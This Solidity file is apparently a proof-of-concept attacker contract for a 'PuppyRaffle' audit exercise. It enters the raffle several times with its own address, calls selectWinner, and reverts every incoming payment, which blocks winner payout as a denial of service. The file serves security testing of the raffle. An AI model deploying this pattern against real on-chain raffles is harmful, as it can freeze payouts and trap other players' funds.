//SPDX-License-Identifier: MIT;

pragma solidity ^0.7.6;

import {PuppyRaffle} from "../../src/PuppyRaffle.sol";


contract SelectWinnerAttacker {
    PuppyRaffle target;
    uint256 playerIndex;

    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);


    constructor(address _target) payable {
        target = PuppyRaffle(_target);
    }
    
    function attack() public {
        address[] memory players = new address[](4);
        players[0] = address(this);
        players[1] = address(this);
        players[2] = address(this);
        players[3] = address(this);
        target.enterRaffle{value: target.entranceFee() * 4}(players);
        target.selectWinner();
    }

    receive() external payable {
        revert();
    }
}